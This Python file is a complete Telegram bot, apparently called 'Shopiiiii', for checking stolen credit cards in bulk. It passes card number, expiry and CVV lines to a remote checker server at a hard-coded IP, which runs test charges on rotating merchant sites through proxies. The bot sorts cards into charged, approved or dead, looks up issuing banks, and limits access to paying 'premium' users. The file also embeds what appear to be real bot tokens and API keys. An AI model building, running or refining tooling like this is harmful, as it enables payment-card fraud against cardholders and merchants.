#!/usr/bin/env python3
"""
Shopiiiii - Advanced CC Checker Bot
Modern Architecture with Enhanced Features
"""

from telethon import TelegramClient, events, Button
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
from dataclasses import dataclass
from typing import Optional, List, Dict
from datetime import datetime

# ============================================================================
# CONFIGURATION
# ============================================================================

@dataclass
class BotConfig:
    """Bot Configuration"""
    API_ID = 21124241
    API_HASH = 'b7ddce3d3683f54be788fddae73fa468'
    BOT_TOKEN = '8914967757:AAG_SqyEghOD8Zr_2Tzskw8qbD6VWgFoGCI'
    CHECKER_API = 'http://148.230.102.178:8081/'
    OWNER_ID = 5895386985

    PREMIUM_FILE = 'premium.txt'
    SITES_FILE = 'sites.txt'
    PROXY_FILE = 'proxy.txt'
    LOGS_FILE = 'checker_logs.json'

config = BotConfig()

# ============================================================================
# EMOJI SYSTEM
# ============================================================================

class EmojiRenderer:
    """Handle Premium Telegram Emojis"""
    EMOJIS = {
        "✅": "6023660820544623088", "🔥": "5999340396432333728",
        "❌": "6037570896766438989", "⚡": "6026367225466720832",
        "💳": "5971944878815317190", "💠": "5971837723676249096",
        "📊": "5971837723676249096", "📦": "6066395745139824604",
        "🌐": "6026367225466720832", "🎯": "5974235702701853774",
        "🤖": "6057466460886799210", "💰": "5971944878815317190",
        "⏳": "5971837723676249096", "🚀": "6282977077427702833",
        "⚠️": "5420323339723881652", "💎": "6023660820544623088",
        "😡": "6023660820544623088", "🫆": "6023660820544623088",
        "🫦": "6023660820544623088", "📋": "5974235702701853774",
        "🔄": "5971837723676249096", "🏦": "6023660820544623088",
    }

    @staticmethod
    def render(text: str) -> str:
        """Render emojis to premium format"""
        if not text:
            return text
        result = text
        for emoji, doc_id in EmojiRenderer.EMOJIS.items():
            result = result.replace(emoji, f'<tg-emoji emoji-id="{doc_id}">{emoji}</tg-emoji>')
        return result

# ============================================================================
# DATA MANAGEMENT
# ============================================================================

class DataManager:
    """Manage bot data files"""

    @staticmethod
    def read_file(filepath: str) -> List[str]:
        """Read file lines"""
        if not os.path.exists(filepath):
            return []
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                return [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"❌ Error reading {filepath}: {e}")
            return []

    @staticmethod
    async def write_file(filepath: str, lines: List[str]):
        """Write lines to file"""
        try:
            async with aiofiles.open(filepath, 'w', encoding='utf-8') as f:
                for line in lines:
                    await f.write(f"{line}\n")
        except Exception as e:
            print(f"❌ Error writing {filepath}: {e}")

    @staticmethod
    def load_premium_users() -> List[str]:
        return DataManager.read_file(config.PREMIUM_FILE)

    @staticmethod
    def load_sites() -> List[str]:
        return DataManager.read_file(config.SITES_FILE)

    @staticmethod
    def load_proxies() -> List[str]:
        return DataManager.read_file(config.PROXY_FILE)

    @staticmethod
    def is_premium(user_id: int) -> bool:
        """Check if user is premium"""
        if user_id == config.OWNER_ID:
            return True
        return str(user_id) in DataManager.load_premium_users()

# ============================================================================
# CHECKER ENGINE
# ============================================================================

class CardValidator:
    """Validate and parse credit cards"""

    CARD_PATTERN = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'

    @staticmethod
    def extract(text: str) -> List[str]:
        """Extract valid cards from text"""
        matches = re.findall(CardValidator.CARD_PATTERN, text)
        cards = []
        for card, month, year, cvv in matches:
            if len(year) == 2:
                year = '20' + year
            cards.append(f"{card}|{month}|{year}|{cvv}")
        return cards

    @staticmethod
    def is_valid(card: str) -> bool:
        """Validate card format"""
        parts = card.split('|')
        return len(parts) == 4 and all(len(p) > 0 for p in parts)

class ErrorDetector:
    """Detect dead sites and errors"""

    DEAD_KEYWORDS = {
        'timeout', 'cloudflare', 'access denied', 'ssl error',
        '502', '503', '504', 'bad gateway', 'connection failed',
        'captcha required', 'site dead', 'invalid url', 'timed out',
        'could not resolve', 'network error', 'connection reset',
        'empty reply', 'http error', 'unreachable', 'service unavailable',
        'failed to', 'submit rejected', 'handle error', 'http 404',
    }

    @staticmethod
    def is_dead(error_msg: str) -> bool:
        """Check if error indicates dead site"""
        if not error_msg:
            return True
        error_lower = str(error_msg).lower()
        return any(kw in error_lower for kw in ErrorDetector.DEAD_KEYWORDS)

class CheckerEngine:
    """Main card checking engine"""

    def __init__(self):
        self.session = None

    async def check(self, card: str, site: str, proxy: str) -> Dict:
        """Check credit card"""
        if not CardValidator.is_valid(card):
            return {'status': 'Invalid', 'message': 'Bad format', 'card': card}

        try:
            timeout = aiohttp.ClientTimeout(total=30)
            params = {'cc': card, 'url': site, 'proxy': proxy}

            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(config.CHECKER_API, params=params) as resp:
                    data = await resp.json(content_type=None)

            msg = data.get('Response', '')
            status = data.get('Status', '')
            gate = data.get('Gate', 'default')
            price = data.get('Price', '-')

            return self._parse_response(msg, status, card, site, gate, price)

        except asyncio.TimeoutError:
            return {'status': 'Timeout', 'message': 'Request timeout', 'card': card, 'retry': True}
        except Exception as e:
            return {'status': 'Error', 'message': str(e), 'card': card}

    @staticmethod
    def _parse_response(msg: str, status: str, card: str, site: str, gate: str, price: str) -> Dict:
        """Parse API response"""
        if ErrorDetector.is_dead(msg):
            return {'status': 'Dead', 'message': msg, 'card': card, 'retry': True}

        msg_lower = msg.lower()

        if status == 'Charged' or 'order completed' in msg_lower or '💎' in msg:
            return {'status': 'Charged', 'message': msg, 'card': card, 'site': site, 'gate': gate, 'price': price}

        if status == 'Approved' or any(k in msg_lower for k in ['approved', 'success', 'insufficient_funds', 'invalid_cvv', 'incorrect_zip']):
            return {'status': 'Approved', 'message': msg, 'card': card, 'site': site, 'gate': gate, 'price': price}

        if 'thank you' in msg_lower or 'payment successful' in msg_lower:
            return {'status': 'Charged', 'message': msg, 'card': card, 'site': site, 'gate': gate, 'price': price}

        return {'status': 'Declined', 'message': msg, 'card': card, 'site': site, 'gate': gate, 'price': price}

class ProxyTester:
    """Test proxies and sites"""

    @staticmethod
    async def test_proxy(proxy: str) -> bool:
        """Test single proxy"""
        try:
            timeout = aiohttp.ClientTimeout(total=10)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get('http://httpbin.org/ip', proxy=f'http://{proxy}') as resp:
                    return resp.status == 200
        except:
            return False

    @staticmethod
    async def test_site(site: str, proxy: str) -> bool:
        """Test single site"""
        try:
            timeout = aiohttp.ClientTimeout(total=15)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(site, proxy=f'http://{proxy}') as resp:
                    return resp.status in [200, 301, 302]
        except:
            return False

    @staticmethod
    async def get_bin_info(card_number: str) -> Dict:
        """Get BIN information"""
        try:
            bin_num = card_number[:6]
            timeout = aiohttp.ClientTimeout(total=10)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(f'https://bins.antipublic.cc/bins/{bin_num}') as res:
                    if res.status == 200:
                        return await res.json()
        except:
            pass
        return {}

# ============================================================================
# BOT HANDLERS
# ============================================================================

bot = TelegramClient('checker_bot', config.API_ID, config.API_HASH).start(bot_token=config.BOT_TOKEN)
checker = CheckerEngine()
active_sessions = {}

@bot.on(events.NewMessage(pattern='/start'))
async def start_handler(event):
    """Start command with main menu"""
    buttons = [
        [Button.inline("💳 Check Card", data=b"check"), Button.inline("📊 Stats", data=b"stats")],
        [Button.inline("🔧 Tools", data=b"tools"), Button.inline("❓ Help", data=b"help")],
    ]

    msg = EmojiRenderer.render(
        "<b>⚡ SHOPIIIII - CC Checker Bot ⚡</b>\n\n"
        "<b>━━━━━━━━━━━━━━━━━━━━</b>\n\n"
        "🎯 <b>Fast & Reliable Card Checking</b>\n"
        "🌐 <b>Multi-Site Support</b>\n"
        "🔄 <b>Batch Processing</b>\n"
        "📊 <b>Live Statistics</b>\n\n"
        "<b>━━━━━━━━━━━━━━━━━━━━</b>\n\n"
        "<b>📝 Commands:</b>\n"
        "• <code>/cc CARD|MM|YY|CVV</code>\n"
        "• <code>/chk</code> - From file\n"
        "• <code>/site</code> - Manage sites\n"
        "• <code>/proxy</code> - Manage proxies\n\n"
        "<b>⚠️ Premium Access Required</b>"
    )

    await event.reply(msg, parse_mode='html', buttons=buttons)

@bot.on(events.NewMessage(pattern=r'^/cc\s+'))
async def check_single_handler(event):
    """Check single card"""
    user_id = event.sender_id

    if not DataManager.is_premium(user_id):
        await event.reply(EmojiRenderer.render("❌ Premium only!"), parse_mode='html')
        return

    sites = DataManager.load_sites()
    proxies = DataManager.load_proxies()

    if not sites or not proxies:
        await event.reply(EmojiRenderer.render("❌ Missing sites or proxies"), parse_mode='html')
        return

    card = event.message.text.replace('/cc ', '').strip()

    if not CardValidator.is_valid(card):
        await event.reply(EmojiRenderer.render("❌ Format: <code>CARD|MM|YY|CVV</code>"), parse_mode='html')
        return

    status = await event.reply(EmojiRenderer.render("⏳ Checking..."))

    try:
        site = random.choice(sites)
        proxy = random.choice(proxies)
        result = await checker.check(card, site, proxy)
        bin_info = await ProxyTester.get_bin_info(card.split('|')[0])

        card_masked = f"{card.split('|')[0][:6]}****{card.split('|')[0][-4:]}"
        bank = bin_info.get('bank', '-')
        country = bin_info.get('country_name', '-')
        brand = bin_info.get('brand', '-')

        output = EmojiRenderer.render(
            f"<b>💳 Check Result</b>\n"
            f"<b>─────────────</b>\n"
            f"<b>Status:</b> {result['status']}\n"
            f"<b>Card:</b> {card_masked}\n"
            f"<b>Gateway:</b> {result.get('gate', '-')}\n"
            f"<b>Price:</b> {result.get('price', '-')}\n\n"
            f"<b>🏦 Bank Info:</b>\n"
            f"{bank} | {brand} | {country}\n\n"
            f"<b>📝 Response:</b>\n"
            f"<code>{result.get('message', 'N/A')[:150]}</code>"
        )

        await status.edit(output, parse_mode='html')

    except Exception as e:
        await status.edit(EmojiRenderer.render(f"❌ Error: {str(e)[:80]}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/chk'))
async def check_file_handler(event):
    """Check cards from file"""
    user_id = event.sender_id

    if not DataManager.is_premium(user_id):
        await event.reply(EmojiRenderer.render("❌ Premium only!"))
        return

    if not event.reply_to_msg_id:
        await event.reply(EmojiRenderer.render("❌ Reply to .txt file with cards"))
        return

    reply = await event.get_reply_message()
    if not reply.file or not reply.file.name.endswith('.txt'):
        await event.reply(EmojiRenderer.render("❌ Must be .txt file"))
        return

    sites = DataManager.load_sites()
    proxies = DataManager.load_proxies()
    if not sites or not proxies:
        await event.reply(EmojiRenderer.render("❌ Missing sites/proxies"))
        return

    status = await event.reply(EmojiRenderer.render("🫆 Processing..."))
    file_path = await reply.download_media()

    try:
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()

        cards = CardValidator.extract(content)
        if not cards:
            await status.edit(EmojiRenderer.render("❌ No cards found"))
            return

        total = min(len(cards), 500000)
        results = {'charged': 0, 'approved': 0, 'declined': 0, 'dead': 0, 'checked': 0, 'start': time.time()}
        sid = f"{user_id}_{status.id}"
        active_sessions[sid] = {'paused': False}

        await status.edit(EmojiRenderer.render(f"🫦 Starting {total} cards..."))

        for card in cards[:total]:
            if sid not in active_sessions:
                break

            while active_sessions[sid]['paused']:
                await asyncio.sleep(1)

            site = random.choice(sites)
            proxy = random.choice(proxies)
            result = await checker.check(card, site, proxy)

            if result['status'] == 'Charged':
                results['charged'] += 1
            elif result['status'] == 'Approved':
                results['approved'] += 1
            elif result['status'] == 'Dead':
                results['dead'] += 1
            else:
                results['declined'] += 1

            results['checked'] += 1

            if results['checked'] % 20 == 0:
                elapsed = int(time.time() - results['start'])
                msg = EmojiRenderer.render(
                    f"🔥 <b>Progress</b>\n"
                    f"<b>─────────────</b>\n"
                    f"<b>Checked:</b> {results['checked']}/{total}\n"
                    f"<b>💎 Charged:</b> {results['charged']}\n"
                    f"<b>✅ Approved:</b> {results['approved']}\n"
                    f"<b>❌ Declined:</b> {results['declined']}\n"
                    f"<b>⚠️ Dead:</b> {results['dead']}\n"
                    f"<b>⏱️ Time:</b> {elapsed}s"
                )
                await status.edit(msg, parse_mode='html')

        elapsed = int(time.time() - results['start'])
        final = EmojiRenderer.render(
            f"<b>✅ Finished!</b>\n"
            f"<b>─────────────</b>\n"
            f"<b>Total:</b> {total}\n"
            f"<b>💎 Charged:</b> {results['charged']}\n"
            f"<b>✅ Approved:</b> {results['approved']}\n"
            f"<b>❌ Declined:</b> {results['declined']}\n"
            f"<b>⚠️ Dead:</b> {results['dead']}\n"
            f"<b>Time:</b> {elapsed}s"
        )
        await status.edit(final, parse_mode='html')

        if sid in active_sessions:
            del active_sessions[sid]

    except Exception as e:
        await status.edit(EmojiRenderer.render(f"❌ Error: {str(e)[:80]}"), parse_mode='html')
    finally:
        if os.path.exists(file_path):
            os.remove(file_path)

@bot.on(events.NewMessage(pattern=r'^/site'))
async def site_check_handler(event):
    """Check and clean sites"""
    user_id = event.sender_id
    if not DataManager.is_premium(user_id):
        await event.reply(EmojiRenderer.render("❌ Premium only!"))
        return

    sites = DataManager.load_sites()
    proxies = DataManager.load_proxies()
    if not sites or not proxies:
        await event.reply(EmojiRenderer.render("❌ Missing data"))
        return

    status = await event.reply(EmojiRenderer.render(f"🔥 Checking {len(sites)} sites..."))
    alive, dead = [], []

    try:
        for i in range(0, len(sites), 50):
            batch = sites[i:i+50]
            tasks = [ProxyTester.test_site(s, random.choice(proxies)) for s in batch]
            results = await asyncio.gather(*tasks)

            for site, is_alive in zip(batch, results):
                if is_alive:
                    alive.append(site)
                else:
                    dead.append(site)

            msg = EmojiRenderer.render(
                f"🔥 <b>Checking Sites</b>\n"
                f"<b>─────────────</b>\n"
                f"<b>Checked:</b> {len(alive)+len(dead)}/{len(sites)}\n"
                f"<b>✅ Alive:</b> {len(alive)}\n"
                f"<b>❌ Dead:</b> {len(dead)}"
            )
            await status.edit(msg, parse_mode='html')

        await DataManager.write_file(config.SITES_FILE, alive)
        final = EmojiRenderer.render(
            f"<b>✅ Done!</b>\n"
            f"<b>Total:</b> {len(sites)}\n"
            f"<b>Alive:</b> {len(alive)}\n"
            f"<b>Removed:</b> {len(dead)}"
        )
        await status.edit(final, parse_mode='html')

    except Exception as e:
        await status.edit(EmojiRenderer.render(f"❌ Error: {str(e)[:80]}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/proxy'))
async def proxy_check_handler(event):
    """Check and clean proxies"""
    user_id = event.sender_id
    if not DataManager.is_premium(user_id):
        await event.reply(EmojiRenderer.render("❌ Premium only!"))
        return

    proxies = DataManager.load_proxies()
    if not proxies:
        await event.reply(EmojiRenderer.render("❌ No proxies"))
        return

    status = await event.reply(EmojiRenderer.render(f"🔥 Checking {len(proxies)} proxies..."))
    alive, dead = [], []

    try:
        for i in range(0, len(proxies), 50):
            batch = proxies[i:i+50]
            tasks = [ProxyTester.test_proxy(p) for p in batch]
            results = await asyncio.gather(*tasks)

            for proxy, is_alive in zip(batch, results):
                if is_alive:
                    alive.append(proxy)
                else:
                    dead.append(proxy)

            msg = EmojiRenderer.render(
                f"🔥 <b>Checking Proxies</b>\n"
                f"<b>─────────────</b>\n"
                f"<b>Checked:</b> {len(alive)+len(dead)}/{len(proxies)}\n"
                f"<b>✅ Alive:</b> {len(alive)}\n"
                f"<b>❌ Dead:</b> {len(dead)}"
            )
            await status.edit(msg, parse_mode='html')

        await DataManager.write_file(config.PROXY_FILE, alive)
        final = EmojiRenderer.render(
            f"<b>✅ Done!</b>\n"
            f"<b>Total:</b> {len(proxies)}\n"
            f"<b>Alive:</b> {len(alive)}\n"
            f"<b>Removed:</b> {len(dead)}"
        )
        await status.edit(final, parse_mode='html')

    except Exception as e:
        await status.edit(EmojiRenderer.render(f"❌ Error: {str(e)[:80]}"), parse_mode='html')

@bot.on(events.CallbackQuery(pattern=b"help"))
async def help_callback(event):
    """Help menu"""
    msg = EmojiRenderer.render(
        "<b>❓ Bot Commands</b>\n\n"
        "<b>/cc CARD|MM|YY|CVV</b> - Check card\n"
        "<b>/chk</b> - From file\n"
        "<b>/site</b> - Check sites\n"
        "<b>/proxy</b> - Check proxies\n"
    )
    await event.edit(msg, parse_mode='html')
    await event.answer()

@bot.on(events.CallbackQuery(pattern=b"check|stats|tools"))
async def menu_callback(event):
    """Menu callbacks"""
    await event.answer("Select option", alert=False)

print("✅ Bot started successfully!")
bot.run_until_disconnected()
